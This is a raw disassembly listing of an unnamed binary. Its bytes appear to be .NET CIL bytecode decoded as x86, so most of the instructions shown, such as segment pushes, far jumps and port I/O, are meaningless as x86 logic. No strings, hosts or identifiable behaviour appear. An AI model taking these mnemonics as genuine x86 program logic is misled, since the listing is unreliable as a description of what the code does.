  404bfc:	29 5a 00             	sub    %ebx,0x0(%edx)
  404bff:	0a 00                	or     (%eax),%al
  404c01:	00 00                	add    %al,(%eax)
  404c03:	00 02                	add    %al,(%edx)
  404c05:	00 1f                	add    %bl,(%edi)
  404c07:	00 6a 89             	add    %ch,-0x77(%edx)
  404c0a:	00 0a                	add    %cl,(%edx)
	...
  404c14:	93                   	xchg   %eax,%ebx
  404c15:	93                   	xchg   %eax,%ebx
  404c16:	00 0a                	add    %cl,(%edx)
  404c18:	01 00                	add    %eax,(%eax)
  404c1a:	00 01                	add    %al,(%ecx)
  404c1c:	13 30                	adc    (%eax),%esi
  404c1e:	02 00                	add    (%eax),%al
  404c20:	2f                   	das
  404c21:	00 00                	add    %al,(%eax)
  404c23:	00 22                	add    %ah,(%edx)
  404c25:	00 00                	add    %al,(%eax)
  404c27:	11 28                	adc    %ebp,(%eax)
  404c29:	da 00                	fiaddl (%eax)
  404c2b:	00 0a                	add    %cl,(%edx)
  404c2d:	0a 16                	or     (%esi),%dl
  404c2f:	0b 2b                	or     (%ebx),%ebp
  404c31:	1d 06 07 9a 0c       	sbb    $0xc9a0706,%eax
  404c36:	08 6f db             	or     %ch,-0x25(%edi)
  404c39:	00 00                	add    %al,(%eax)
  404c3b:	0a 02                	or     (%edx),%al
  404c3d:	6f                   	outsl  %ds:(%esi),(%dx)
  404c3e:	dc 00                	faddl  (%eax)
  404c40:	00 0a                	add    %cl,(%edx)
  404c42:	28 dd                	sub    %bl,%ch
  404c44:	00 00                	add    %al,(%eax)
  404c46:	0a 2c 02             	or     (%edx,%eax,1),%ch
  404c49:	08 2a                	or     %ch,(%edx)
  404c4b:	07                   	pop    %es
  404c4c:	17                   	pop    %ss
  404c4d:	58                   	pop    %eax
  404c4e:	0b 07                	or     (%edi),%eax
  404c50:	06                   	push   %es
  404c51:	8e 69 32             	mov    0x32(%ecx),%gs
  404c54:	dd 14 2a             	fstl   (%edx,%ebp,1)
  404c57:	00 1b                	add    %bl,(%ebx)
  404c59:	30 01                	xor    %al,(%ecx)
  404c5b:	00 11                	add    %dl,(%ecx)
  404c5d:	00 00                	add    %al,(%eax)
  404c5f:	00 00                	add    %al,(%eax)
  404c61:	00 00                	add    %al,(%eax)
  404c63:	00 20                	add    %ah,(%eax)
  404c65:	03 00                	add    (%eax),%eax
  404c67:	00 80 28 85 00 00    	add    %al,0x8528(%eax)
  404c6d:	06                   	push   %es
  404c6e:	26 de 03             	fiadds %es:(%ebx)
  404c71:	26 de 00             	fiadds %es:(%eax)
  404c74:	2a 00                	sub    (%eax),%al
  404c76:	00 00                	add    %al,(%eax)
  404c78:	01 10                	add    %edx,(%eax)
  404c7a:	00 00                	add    %al,(%eax)
  404c7c:	00 00                	add    %al,(%eax)
  404c7e:	00 00                	add    %al,(%eax)
  404c80:	0d 0d 00 03 01       	or     $0x103000d,%eax
  404c85:	00 00                	add    %al,(%eax)
  404c87:	01 13                	add    %edx,(%ebx)
  404c89:	30 03                	xor    %al,(%ebx)
  404c8b:	00 14 00             	add    %dl,(%eax,%eax,1)
  404c8e:	00 00                	add    %al,(%eax)
  404c90:	02 00                	add    (%eax),%al
  404c92:	00 11                	add    %dl,(%ecx)
  404c94:	16                   	push   %ss
  404c95:	7e 08                	jle    0x404c9f
  404c97:	00 00                	add    %al,(%eax)
  404c99:	04 12                	add    $0x12,%al
  404c9b:	00 73 de             	add    %dh,-0x22(%ebx)
  404c9e:	00 00                	add    %al,(%eax)
  404ca0:	0a 80 39 00 00 04    	or     0x4000039(%eax),%al
  404ca6:	06                   	push   %es
  404ca7:	2a 1b                	sub    (%ebx),%bl
  404ca9:	30 03                	xor    %al,(%ebx)
  404cab:	00 24 00             	add    %ah,(%eax,%eax,1)
  404cae:	00 00                	add    %al,(%eax)
  404cb0:	00 00                	add    %al,(%eax)
  404cb2:	00 00                	add    %al,(%eax)
  404cb4:	14 fe                	adc    $0xfe,%al
  404cb6:	06                   	push   %es
  404cb7:	89 00                	mov    %eax,(%eax)
  404cb9:	00 06                	add    %al,(%esi)
  404cbb:	73 e0                	jae    0x404c9d
  404cbd:	00 00                	add    %al,(%eax)
  404cbf:	0a 28                	or     (%eax),%ch
  404cc1:	e1 00                	loope  0x404cc3
  404cc3:	00 0a                	add    %cl,(%edx)
  404cc5:	28 e2                	sub    %ah,%dl
  404cc7:	00 00                	add    %al,(%eax)
  404cc9:	0a 17                	or     (%edi),%dl
  404ccb:	16                   	push   %ss
  404ccc:	16                   	push   %ss
  404ccd:	28 8c 00 00 06 de 03 	sub    %cl,0x3de0600(%eax,%eax,1)
  404cd4:	26 de 00             	fiadds %es:(%eax)
  404cd7:	2a 01                	sub    (%ecx),%al
  404cd9:	10 00                	adc    %al,(%eax)
  404cdb:	00 00                	add    %al,(%eax)
  404cdd:	00 00                	add    %al,(%eax)
  404cdf:	00 20                	add    %ah,(%eax)
  404ce1:	20 00                	and    %al,(%eax)
  404ce3:	03 01                	add    (%ecx),%eax
  404ce5:	00 00                	add    %al,(%eax)
  404ce7:	01 1b                	add    %ebx,(%ebx)
  404ce9:	30 03                	xor    %al,(%ebx)
  404ceb:	00 18                	add    %bl,(%eax)
  404ced:	00 00                	add    %al,(%eax)
  404cef:	00 00                	add    %al,(%eax)
  404cf1:	00 00                	add    %al,(%eax)
  404cf3:	00 16                	add    %dl,(%esi)
  404cf5:	16                   	push   %ss
  404cf6:	16                   	push   %ss
  404cf7:	28 8c 00 00 06 de 0d 	sub    %cl,0xdde0600(%eax,%eax,1)
  404cfe:	26 20 a0 86 01 00 28 	and    %ah,%es:0x28000186(%eax)
  404d05:	14 00                	adc    $0x0,%al
  404d07:	00 0a                	add    %cl,(%edx)
  404d09:	2b f4                	sub    %esp,%esi
  404d0b:	2a 01                	sub    (%ecx),%al
  404d0d:	10 00                	adc    %al,(%eax)
  404d0f:	00 00                	add    %al,(%eax)
  404d11:	00 00                	add    %al,(%eax)
  404d13:	00 0a                	add    %cl,(%edx)
  404d15:	0a 00                	or     (%eax),%al
  404d17:	0d 01 00 00 01       	or     $0x1000001,%eax
  404d1c:	1b 30                	sbb    (%eax),%esi
  404d1e:	04 00                	add    $0x0,%al
  404d20:	38 00                	cmp    %al,(%eax)
  404d22:	00 00                	add    %al,(%eax)
  404d24:	23 00                	and    (%eax),%eax
  404d26:	00 11                	add    %dl,(%ecx)
  404d28:	7e 99                	jle    0x404cc3
  404d2a:	00 00                	add    %al,(%eax)
  404d2c:	0a 7e 3a             	or     0x3a(%esi),%bh
  404d2f:	00 00                	add    %al,(%eax)
  404d31:	04 18                	add    $0x18,%al
  404d33:	6f                   	outsl  %ds:(%esi),(%dx)
  404d34:	e3 00                	jecxz  0x404d36
  404d36:	00 0a                	add    %cl,(%edx)
  404d38:	0a 06                	or     (%esi),%al
  404d3a:	02 03                	add    (%ebx),%al
  404d3c:	18 6f e4             	sbb    %ch,-0x1c(%edi)
  404d3f:	00 00                	add    %al,(%eax)
  404d41:	0a 17                	or     (%edi),%dl
  404d43:	0b de                	or     %esi,%ebx
  404d45:	18 06                	sbb    %al,(%esi)
  404d47:	2c 06                	sub    $0x6,%al
  404d49:	06                   	push   %es
  404d4a:	6f                   	outsl  %ds:(%esi),(%dx)
  404d4b:	33 00                	xor    (%eax),%eax
  404d4d:	00 0a                	add    %cl,(%edx)
  404d4f:	dc 6f e5             	fsubrl -0x1b(%edi)
  404d52:	00 00                	add    %al,(%eax)
  404d54:	0a 28                	or     (%eax),%ch
  404d56:	95                   	xchg   %eax,%ebp
  404d57:	00 00                	add    %al,(%eax)
  404d59:	06                   	push   %es
  404d5a:	de 00                	fiadds (%eax)
  404d5c:	16                   	push   %ss
  404d5d:	2a 07                	sub    (%edi),%al
  404d5f:	2a 01                	sub    (%ecx),%al
  404d61:	1c 00                	sbb    $0x0,%al
  404d63:	00 02                	add    %al,(%edx)
  404d65:	00 11                	add    %dl,(%ecx)
  404d67:	00 0d 1e 00 0a 00    	add    %cl,0xa001e
  404d6d:	00 00                	add    %al,(%eax)
  404d6f:	00 00                	add    %al,(%eax)
  404d71:	00 00                	add    %al,(%eax)
  404d73:	00 28                	add    %ch,(%eax)
  404d75:	28 00                	sub    %al,(%eax)
  404d77:	0c 32                	or     $0x32,%al
  404d79:	00 00                	add    %al,(%eax)
  404d7b:	01 1b                	add    %ebx,(%ebx)
  404d7d:	30 02                	xor    %al,(%edx)
  404d7f:	00 39                	add    %bh,(%ecx)
  404d81:	00 00                	add    %al,(%eax)
  404d83:	00 24 00             	add    %ah,(%eax,%eax,1)
  404d86:	00 11                	add    %dl,(%ecx)
  404d88:	7e 99                	jle    0x404d23
  404d8a:	00 00                	add    %al,(%eax)
  404d8c:	0a 7e 3a             	or     0x3a(%esi),%bh
  404d8f:	00 00                	add    %al,(%eax)
  404d91:	04 6f                	add    $0x6f,%al
  404d93:	e6 00                	out    %al,$0x0
  404d95:	00 0a                	add    %cl,(%edx)
  404d97:	0a 06                	or     (%esi),%al
  404d99:	02 6f e7             	add    -0x19(%edi),%ch
  404d9c:	00 00                	add    %al,(%eax)
  404d9e:	0a 74 39 00          	or     0x0(%ecx,%edi,1),%dh
  404da2:	00 01                	add    %al,(%ecx)
  404da4:	0b de                	or     %esi,%ebx
  404da6:	18 06                	sbb    %al,(%esi)
  404da8:	2c 06                	sub    $0x6,%al
  404daa:	06                   	push   %es
  404dab:	6f                   	outsl  %ds:(%esi),(%dx)
  404dac:	33 00                	xor    (%eax),%eax
  404dae:	00 0a                	add    %cl,(%edx)
  404db0:	dc 6f e5             	fsubrl -0x1b(%edi)
  404db3:	00 00                	add    %al,(%eax)
  404db5:	0a 28                	or     (%eax),%ch
  404db7:	95                   	xchg   %eax,%ebp
  404db8:	00 00                	add    %al,(%eax)
  404dba:	06                   	push   %es
  404dbb:	de 00                	fiadds (%eax)
  404dbd:	14 2a                	adc    $0x2a,%al
  404dbf:	07                   	pop    %es
  404dc0:	2a 00                	sub    (%eax),%al
  404dc2:	00 00                	add    %al,(%eax)
  404dc4:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  404dc7:	00 02                	add    %al,(%edx)
  404dc9:	00 10                	add    %dl,(%eax)
  404dcb:	00 0f                	add    %cl,(%edi)
  404dcd:	1f                   	pop    %ds
  404dce:	00 0a                	add    %cl,(%edx)
	...
  404dd8:	29 29                	sub    %ebp,(%ecx)
  404dda:	00 0c 32             	add    %cl,(%edx,%esi,1)
  404ddd:	00 00                	add    %al,(%eax)
  404ddf:	01 1b                	add    %ebx,(%ebx)
  404de1:	30 02                	xor    %al,(%edx)
  404de3:	00 35 00 00 00 23    	add    %dh,0x23000000
  404de9:	00 00                	add    %al,(%eax)
  404deb:	11 7e 99             	adc    %edi,-0x67(%esi)
  404dee:	00 00                	add    %al,(%eax)
  404df0:	0a 7e 3a             	or     0x3a(%esi),%bh
  404df3:	00 00                	add    %al,(%eax)
  404df5:	04 6f                	add    $0x6f,%al
  404df7:	e6 00                	out    %al,$0x0
  404df9:	00 0a                	add    %cl,(%edx)
  404dfb:	0a 06                	or     (%esi),%al
  404dfd:	02 6f e8             	add    -0x18(%edi),%ch
  404e00:	00 00                	add    %al,(%eax)
  404e02:	0a 17                	or     (%edi),%dl
  404e04:	0b de                	or     %esi,%ebx
  404e06:	18 06                	sbb    %al,(%esi)
  404e08:	2c 06                	sub    $0x6,%al
  404e0a:	06                   	push   %es
  404e0b:	6f                   	outsl  %ds:(%esi),(%dx)
  404e0c:	33 00                	xor    (%eax),%eax
  404e0e:	00 0a                	add    %cl,(%edx)
  404e10:	dc 6f e5             	fsubrl -0x1b(%edi)
  404e13:	00 00                	add    %al,(%eax)
  404e15:	0a 28                	or     (%eax),%ch
  404e17:	95                   	xchg   %eax,%ebp
  404e18:	00 00                	add    %al,(%eax)
  404e1a:	06                   	push   %es
  404e1b:	de 00                	fiadds (%eax)
  404e1d:	16                   	push   %ss
  404e1e:	2a 07                	sub    (%edi),%al
  404e20:	2a 00                	sub    (%eax),%al
  404e22:	00 00                	add    %al,(%eax)
  404e24:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  404e27:	00 02                	add    %al,(%edx)
  404e29:	00 10                	add    %dl,(%eax)
  404e2b:	00 0b                	add    %cl,(%ebx)
  404e2d:	1b 00                	sbb    (%eax),%eax
  404e2f:	0a 00                	or     (%eax),%al
  404e31:	00 00                	add    %al,(%eax)
  404e33:	00 00                	add    %al,(%eax)
  404e35:	00 00                	add    %al,(%eax)
  404e37:	00 25 25 00 0c 32    	add    %ah,0x320c0025
  404e3d:	00 00                	add    %al,(%eax)
  404e3f:	01 1b                	add    %ebx,(%ebx)
  404e41:	30 03                	xor    %al,(%ebx)
  404e43:	00 3a                	add    %bh,(%edx)
  404e45:	00 00                	add    %al,(%eax)
  404e47:	00 23                	add    %ah,(%ebx)
  404e49:	00 00                	add    %al,(%eax)
  404e4b:	11 7e 99             	adc    %edi,-0x67(%esi)
  404e4e:	00 00                	add    %al,(%eax)
  404e50:	0a 72 6d             	or     0x6d(%edx),%dh
  404e53:	20 00                	and    %al,(%eax)
  404e55:	70 17                	jo     0x404e6e
  404e57:	6f                   	outsl  %ds:(%esi),(%dx)
  404e58:	e9 00 00 0a 0a       	jmp    0xa4a4e5d
  404e5d:	06                   	push   %es
  404e5e:	7e 3a                	jle    0x404e9a
  404e60:	00 00                	add    %al,(%eax)
  404e62:	04 6f                	add    $0x6f,%al
  404e64:	ea 00 00 0a 17 0b de 	ljmp   $0xde0b,$0x170a0000
  404e6b:	18 06                	sbb    %al,(%esi)
  404e6d:	2c 06                	sub    $0x6,%al
  404e6f:	06                   	push   %es
  404e70:	6f                   	outsl  %ds:(%esi),(%dx)
  404e71:	33 00                	xor    (%eax),%eax
  404e73:	00 0a                	add    %cl,(%edx)
  404e75:	dc 6f e5             	fsubrl -0x1b(%edi)
  404e78:	00 00                	add    %al,(%eax)
  404e7a:	0a 28                	or     (%eax),%ch
  404e7c:	95                   	xchg   %eax,%ebp
  404e7d:	00 00                	add    %al,(%eax)
  404e7f:	06                   	push   %es
  404e80:	de 00                	fiadds (%eax)
  404e82:	16                   	push   %ss
  404e83:	2a 07                	sub    (%edi),%al
  404e85:	2a 00                	sub    (%eax),%al
  404e87:	00 01                	add    %al,(%ecx)
  404e89:	1c 00                	sbb    $0x0,%al
  404e8b:	00 02                	add    %al,(%edx)
  404e8d:	00 11                	add    %dl,(%ecx)
  404e8f:	00 0f                	add    %cl,(%edi)
  404e91:	20 00                	and    %al,(%eax)
  404e93:	0a 00                	or     (%eax),%al
  404e95:	00 00                	add    %al,(%eax)
  404e97:	00 00                	add    %al,(%eax)
  404e99:	00 00                	add    %al,(%eax)
  404e9b:	00 2a                	add    %ch,(%edx)
  404e9d:	2a 00                	sub    (%eax),%al
  404e9f:	0c 32                	or     $0x32,%al
  404ea1:	00 00                	add    %al,(%eax)
  404ea3:	01 1b                	add    %ebx,(%ebx)
  404ea5:	30 04 00             	xor    %al,(%eax,%eax,1)
  404ea8:	c4 01                	les    (%ecx),%eax
  404eaa:	00 00                	add    %al,(%eax)
  404eac:	25 00 00 11 73       	and    $0x73110000,%eax
  404eb1:	62 00                	bound  %eax,(%eax)
  404eb3:	00 06                	add    %al,(%esi)
  404eb5:	0a 06                	or     (%esi),%al
  404eb7:	02 74 03 00          	add    0x0(%ebx,%eax,1),%dh
  404ebb:	00 1b                	add    %bl,(%ebx)
  404ebd:	6f                   	outsl  %ds:(%esi),(%dx)
  404ebe:	54                   	push   %esp
  404ebf:	00 00                	add    %al,(%eax)
  404ec1:	06                   	push   %es
  404ec2:	06                   	push   %es
  404ec3:	72 81                	jb     0x404e46
  404ec5:	20 00                	and    %al,(%eax)
  404ec7:	70 6f                	jo     0x404f38
  404ec9:	4d                   	dec    %ebp
  404eca:	00 00                	add    %al,(%eax)
  404ecc:	06                   	push   %es
  404ecd:	6f                   	outsl  %ds:(%esi),(%dx)
  404ece:	59                   	pop    %ecx
  404ecf:	00 00                	add    %al,(%eax)
  404ed1:	06                   	push   %es
  404ed2:	0b 07                	or     (%edi),%eax
  404ed4:	39 8c 01 00 00 07 72 	cmp    %ecx,0x72070000(%ecx,%eax,1)
  404edb:	17                   	pop    %ss
  404edc:	26 00 70 28          	add    %dh,%es:0x28(%eax)
  404ee0:	27                   	daa
  404ee1:	00 00                	add    %al,(%eax)
  404ee3:	0a 2d 22 07 72 21    	or     0x21720722,%ch
  404ee9:	26 00 70 28          	add    %dh,%es:0x28(%eax)
  404eed:	27                   	daa
  404eee:	00 00                	add    %al,(%eax)
  404ef0:	0a 2d 56 07 72 2f    	or     0x2f720756,%ch
  404ef6:	26 00 70 28          	add    %dh,%es:0x28(%eax)
  404efa:	27                   	daa
  404efb:	00 00                	add    %al,(%eax)
  404efd:	0a 3a                	or     (%edx),%bh
  404eff:	cb                   	lret
  404f00:	00 00                	add    %al,(%eax)
  404f02:	00 38                	add    %bh,(%eax)
  404f04:	5d                   	pop    %ebp
  404f05:	01 00                	add    %eax,(%eax)
  404f07:	00 28                	add    %ch,(%eax)
  404f09:	17                   	pop    %ss
  404f0a:	00 00                	add    %al,(%eax)
  404f0c:	06                   	push   %es
  404f0d:	0c 73                	or     $0x73,%al
  404f0f:	62 00                	bound  %eax,(%eax)
  404f11:	00 06                	add    %al,(%esi)
  404f13:	25 72 81 20 00       	and    $0x208172,%eax
  404f18:	70 6f                	jo     0x404f89
  404f1a:	4d                   	dec    %ebp
  404f1b:	00 00                	add    %al,(%eax)
  404f1d:	06                   	push   %es
  404f1e:	72 17                	jb     0x404f37
  404f20:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  404f24:	4f                   	dec    %edi
  404f25:	00 00                	add    %al,(%eax)
  404f27:	06                   	push   %es
  404f28:	25 72 99 20 00       	and    $0x209972,%eax
  404f2d:	70 6f                	jo     0x404f9e
  404f2f:	4d                   	dec    %ebp
  404f30:	00 00                	add    %al,(%eax)
  404f32:	06                   	push   %es
  404f33:	08 6a 6f             	or     %ch,0x6f(%edx)
  404f36:	42                   	inc    %edx
  404f37:	00 00                	add    %al,(%eax)
  404f39:	06                   	push   %es
  404f3a:	6f                   	outsl  %ds:(%esi),(%dx)
  404f3b:	57                   	push   %edi
  404f3c:	00 00                	add    %al,(%eax)
  404f3e:	06                   	push   %es
  404f3f:	28 1e                	sub    %bl,(%esi)
  404f41:	00 00                	add    %al,(%eax)
  404f43:	06                   	push   %es
  404f44:	38 1c 01             	cmp    %bl,(%ecx,%eax,1)
  404f47:	00 00                	add    %al,(%eax)
  404f49:	00 06                	add    %al,(%esi)
  404f4b:	28 93 00 00 06 dd    	sub    %dl,-0x22fa0000(%ebx)
  404f51:	10 01                	adc    %al,(%ecx)
  404f53:	00 00                	add    %al,(%eax)
  404f55:	0d 06 72 45 26       	or     $0x26457206,%eax
  404f5a:	00 70 6f             	add    %dh,0x6f(%eax)
  404f5d:	4d                   	dec    %ebp
  404f5e:	00 00                	add    %al,(%eax)
  404f60:	06                   	push   %es
  404f61:	6f                   	outsl  %ds:(%esi),(%dx)
  404f62:	59                   	pop    %ecx
  404f63:	00 00                	add    %al,(%eax)
  404f65:	06                   	push   %es
  404f66:	28 8e 00 00 06 2d    	sub    %cl,0x2d060000(%esi)
  404f6c:	51                   	push   %ecx
  404f6d:	7e 3b                	jle    0x404faa
  404f6f:	00 00                	add    %al,(%eax)
  404f71:	04 06                	add    $0x6,%al
  404f73:	6f                   	outsl  %ds:(%esi),(%dx)
  404f74:	5d                   	pop    %ebp
  404f75:	00 00                	add    %al,(%eax)
  404f77:	0a 73 62             	or     0x62(%ebx),%dh
  404f7a:	00 00                	add    %al,(%eax)
  404f7c:	06                   	push   %es
  404f7d:	25 72 81 20 00       	and    $0x208172,%eax
  404f82:	70 6f                	jo     0x404ff3
  404f84:	4d                   	dec    %ebp
  404f85:	00 00                	add    %al,(%eax)
  404f87:	06                   	push   %es
  404f88:	72 4d                	jb     0x404fd7
  404f8a:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  404f8e:	4f                   	dec    %edi
  404f8f:	00 00                	add    %al,(%eax)
  404f91:	06                   	push   %es
  404f92:	25 72 63 26 00       	and    $0x266372,%eax
  404f97:	70 6f                	jo     0x405008
  404f99:	4d                   	dec    %ebp
  404f9a:	00 00                	add    %al,(%eax)
  404f9c:	06                   	push   %es
  404f9d:	06                   	push   %es
  404f9e:	72 45                	jb     0x404fe5
  404fa0:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  404fa4:	4d                   	dec    %ebp
  404fa5:	00 00                	add    %al,(%eax)
  404fa7:	06                   	push   %es
  404fa8:	6f                   	outsl  %ds:(%esi),(%dx)
  404fa9:	59                   	pop    %ecx
  404faa:	00 00                	add    %al,(%eax)
  404fac:	06                   	push   %es
  404fad:	6f                   	outsl  %ds:(%esi),(%dx)
  404fae:	4f                   	dec    %edi
  404faf:	00 00                	add    %al,(%eax)
  404fb1:	06                   	push   %es
  404fb2:	6f                   	outsl  %ds:(%esi),(%dx)
  404fb3:	57                   	push   %edi
  404fb4:	00 00                	add    %al,(%eax)
  404fb6:	06                   	push   %es
  404fb7:	28 1e                	sub    %bl,(%esi)
  404fb9:	00 00                	add    %al,(%eax)
  404fbb:	06                   	push   %es
  404fbc:	2b 0b                	sub    (%ebx),%ecx
  404fbe:	09 6f e5             	or     %ebp,-0x1b(%edi)
  404fc1:	00 00                	add    %al,(%eax)
  404fc3:	0a 28                	or     (%eax),%ch
  404fc5:	95                   	xchg   %eax,%ebp
  404fc6:	00 00                	add    %al,(%eax)
  404fc8:	06                   	push   %es
  404fc9:	dd 97 00 00 00 06    	fstl   0x6000000(%edi)
  404fcf:	72 71                	jb     0x405042
  404fd1:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  404fd5:	4d                   	dec    %ebp
  404fd6:	00 00                	add    %al,(%eax)
  404fd8:	06                   	push   %es
  404fd9:	6f                   	outsl  %ds:(%esi),(%dx)
  404fda:	59                   	pop    %ecx
  404fdb:	00 00                	add    %al,(%eax)
  404fdd:	06                   	push   %es
  404fde:	06                   	push   %es
  404fdf:	72 45                	jb     0x405026
  404fe1:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  404fe5:	4d                   	dec    %ebp
  404fe6:	00 00                	add    %al,(%eax)
  404fe8:	06                   	push   %es
  404fe9:	6f                   	outsl  %ds:(%esi),(%dx)
  404fea:	59                   	pop    %ecx
  404feb:	00 00                	add    %al,(%eax)
  404fed:	06                   	push   %es
  404fee:	28 8d 00 00 06 26    	sub    %cl,0x26060000(%ebp)
  404ff4:	7e 3b                	jle    0x405031
  404ff6:	00 00                	add    %al,(%eax)
  404ff8:	04 28                	add    $0x28,%al
  404ffa:	03 00                	add    (%eax),%eax
  404ffc:	00 2b                	add    %ch,(%ebx)
  404ffe:	6f                   	outsl  %ds:(%esi),(%dx)
  404fff:	5e                   	pop    %esi
  405000:	00 00                	add    %al,(%eax)
  405002:	0a 13                	or     (%ebx),%dl
  405004:	04 2b                	add    $0x2b,%al
  405006:	45                   	inc    %ebp
  405007:	12 04 28             	adc    (%eax,%ebp,1),%al
  40500a:	5f                   	pop    %edi
  40500b:	00 00                	add    %al,(%eax)
  40500d:	0a 13                	or     (%ebx),%dl
  40500f:	05 11 05 72 45       	add    $0x45720511,%eax
  405014:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  405018:	4d                   	dec    %ebp
  405019:	00 00                	add    %al,(%eax)
  40501b:	06                   	push   %es
  40501c:	6f                   	outsl  %ds:(%esi),(%dx)
  40501d:	59                   	pop    %ecx
  40501e:	00 00                	add    %al,(%eax)
  405020:	06                   	push   %es
  405021:	06                   	push   %es
  405022:	72 71                	jb     0x405095
  405024:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  405028:	4d                   	dec    %ebp
  405029:	00 00                	add    %al,(%eax)
  40502b:	06                   	push   %es
  40502c:	6f                   	outsl  %ds:(%esi),(%dx)
  40502d:	59                   	pop    %ecx
  40502e:	00 00                	add    %al,(%eax)
  405030:	06                   	push   %es
  405031:	28 27                	sub    %ah,(%edi)
  405033:	00 00                	add    %al,(%eax)
  405035:	0a 2c 14             	or     (%esp,%edx,1),%ch
  405038:	11 05 28 93 00 00    	adc    %eax,0x9328
  40503e:	06                   	push   %es
  40503f:	7e 3b                	jle    0x40507c
  405041:	00 00                	add    %al,(%eax)
  405043:	04 11                	add    $0x11,%al
  405045:	05 6f ec 00 00       	add    $0xec6f,%eax
  40504a:	0a 26                	or     (%esi),%ah
  40504c:	12 04 28             	adc    (%eax,%ebp,1),%al
  40504f:	61                   	popa
  405050:	00 00                	add    %al,(%eax)
  405052:	0a 2d b2 de 0e 12    	or     0x120edeb2,%ch
  405058:	04 fe                	add    $0xfe,%al
  40505a:	16                   	push   %ss
  40505b:	02 00                	add    (%eax),%al
  40505d:	00 1b                	add    %bl,(%ebx)
  40505f:	6f                   	outsl  %ds:(%esi),(%dx)
  405060:	33 00                	xor    (%eax),%eax
  405062:	00 0a                	add    %cl,(%edx)
  405064:	dc de                	(bad)
  405066:	0c 6f                	or     $0x6f,%al
  405068:	e5 00                	in     $0x0,%eax
  40506a:	00 0a                	add    %cl,(%edx)
  40506c:	28 95 00 00 06 de    	sub    %dl,-0x21fa0000(%ebp)
  405072:	00 2a                	add    %ch,(%edx)
  405074:	41                   	inc    %ecx
  405075:	4c                   	dec    %esp
  405076:	00 00                	add    %al,(%eax)
  405078:	00 00                	add    %al,(%eax)
  40507a:	00 00                	add    %al,(%eax)
  40507c:	9a 00 00 00 0b 00 00 	lcall  $0x0,$0xb000000
  405083:	00 a5 00 00 00 79    	add    %ah,0x79000000(%ebp)
  405089:	00 00                	add    %al,(%eax)
  40508b:	00 32                	add    %dh,(%edx)
  40508d:	00 00                	add    %al,(%eax)
  40508f:	01 02                	add    %eax,(%edx)
  405091:	00 00                	add    %al,(%eax)
  405093:	00 55 01             	add    %dl,0x1(%ebp)
  405096:	00 00                	add    %al,(%eax)
  405098:	52                   	push   %edx
  405099:	00 00                	add    %al,(%eax)
  40509b:	00 a7 01 00 00 0e    	add    %ah,0xe000001(%edi)
	...
  4050ad:	00 00                	add    %al,(%eax)
  4050af:	00 b7 01 00 00 b7    	add    %dh,-0x48ffffff(%edi)
  4050b5:	01 00                	add    %eax,(%eax)
  4050b7:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4050ba:	00 00                	add    %al,(%eax)
  4050bc:	32 00                	xor    (%eax),%al
  4050be:	00 01                	add    %al,(%ecx)
  4050c0:	13 30                	adc    (%eax),%esi
  4050c2:	0b 00                	or     (%eax),%eax
  4050c4:	1b 01                	sbb    (%ecx),%eax
  4050c6:	00 00                	add    %al,(%eax)
  4050c8:	26 00 00             	add    %al,%es:(%eax)
  4050cb:	11 28                	adc    %ebp,(%eax)
  4050cd:	ed                   	in     (%dx),%eax
  4050ce:	00 00                	add    %al,(%eax)
  4050d0:	0a 02                	or     (%edx),%al
  4050d2:	72 45                	jb     0x405119
  4050d4:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  4050d8:	4d                   	dec    %ebp
  4050d9:	00 00                	add    %al,(%eax)
  4050db:	06                   	push   %es
  4050dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4050dd:	59                   	pop    %ecx
  4050de:	00 00                	add    %al,(%eax)
  4050e0:	06                   	push   %es
  4050e1:	28 8e 00 00 06 28    	sub    %cl,0x28060000(%esi)
  4050e7:	9a 00 00 0a 28 1c 00 	lcall  $0x1c,$0x280a0000
  4050ee:	00 0a                	add    %cl,(%edx)
  4050f0:	28 a0 00 00 06 6f    	sub    %ah,0x6f060000(%eax)
  4050f6:	ee                   	out    %al,(%dx)
  4050f7:	00 00                	add    %al,(%eax)
  4050f9:	0a 72 7b             	or     0x7b(%edx),%dh
  4050fc:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  405100:	ef                   	out    %eax,(%dx)
  405101:	00 00                	add    %al,(%eax)
  405103:	0a 28                	or     (%eax),%ch
  405105:	f0 00 00             	lock add %al,(%eax)
  405108:	0a 0a                	or     (%edx),%cl
  40510a:	7e 3c                	jle    0x405148
  40510c:	00 00                	add    %al,(%eax)
  40510e:	04 3a                	add    $0x3a,%al
  405110:	85 00                	test   %eax,(%eax)
  405112:	00 00                	add    %al,(%eax)
  405114:	20 00                	and    %al,(%eax)
  405116:	01 00                	add    %eax,(%eax)
  405118:	00 72 97             	add    %dh,-0x69(%edx)
  40511b:	26 00 70 14          	add    %dh,%es:0x14(%eax)
  40511f:	d0 16                	rclb   $1,(%esi)
  405121:	00 00                	add    %al,(%eax)
  405123:	02 28                	add    (%eax),%ch
  405125:	f1                   	int1
  405126:	00 00                	add    %al,(%eax)
  405128:	0a 1f                	or     (%edi),%bl
  40512a:	09 8d 86 00 00 01    	or     %ecx,0x1000086(%ebp)
  405130:	25 16 16 14 28       	and    $0x28141616,%eax
  405135:	f2 00 00             	repnz add %al,(%eax)
  405138:	0a a2 25 17 17 14    	or     0x14171725(%edx),%ah
  40513e:	28 f2                	sub    %dh,%dl
  405140:	00 00                	add    %al,(%eax)
  405142:	0a a2 25 18 17 14    	or     0x14171825(%edx),%ah
  405148:	28 f2                	sub    %dh,%dl
  40514a:	00 00                	add    %al,(%eax)
  40514c:	0a a2 25 19 17 14    	or     0x14171925(%edx),%ah
  405152:	28 f2                	sub    %dh,%dl
  405154:	00 00                	add    %al,(%eax)
  405156:	0a a2 25 1a 17 14    	or     0x14171a25(%edx),%ah
  40515c:	28 f2                	sub    %dh,%dl
  40515e:	00 00                	add    %al,(%eax)
  405160:	0a a2 25 1b 17 14    	or     0x14171b25(%edx),%ah
  405166:	28 f2                	sub    %dh,%dl
  405168:	00 00                	add    %al,(%eax)
